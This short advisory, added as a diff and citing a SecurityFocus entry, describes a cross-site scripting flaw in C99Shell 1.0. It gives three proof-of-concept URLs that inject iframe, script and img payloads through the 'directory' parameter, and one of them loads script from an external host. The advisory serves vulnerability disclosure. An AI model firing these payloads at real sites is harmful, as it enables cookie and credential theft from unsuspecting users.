@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/40134/info
+
+C99Shell is prone to a cross-site scripting vulnerability because the application fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+C99Shell 1.0 pre-release build 16 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/Ch99.php?directory=<iframe/+/onload=alert(213771818860)></iframe>
+
+http://www.example.com/Ch99.php?directory=<ScRiPt+bad=">"+src="http://127.0.0.1/16.js?213771818860"></ScRiPt>
+
+http://www.example.com/Ch99.php?directory=<img+src=http://127.0.0.1/cars.jpg+onload=alert(213771818860)>
